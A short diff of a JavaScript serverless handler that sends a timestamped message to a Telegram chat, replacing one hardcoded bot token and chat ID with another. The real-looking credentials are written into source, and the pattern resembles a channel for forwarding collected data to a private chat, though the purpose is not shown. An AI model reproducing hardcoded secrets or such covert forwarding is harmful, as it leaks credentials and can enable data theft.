@@ -29,8 +29,8 @@ export default async function handler(req, res) {
 🕓 Timestamp: ${time}
 `;
 
-  const botToken = "8172380019:AAFD8kht9IQyGbHAsdj0DimVRYcwM2SIbxA";
-  const chatId = "-1002479732885";
+  const botToken = "8172380019:AAHubU3XKILFTcTRC7qGGUCOUYeCkDMaAOs";
+  const chatId = "7168737724";
 
   const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
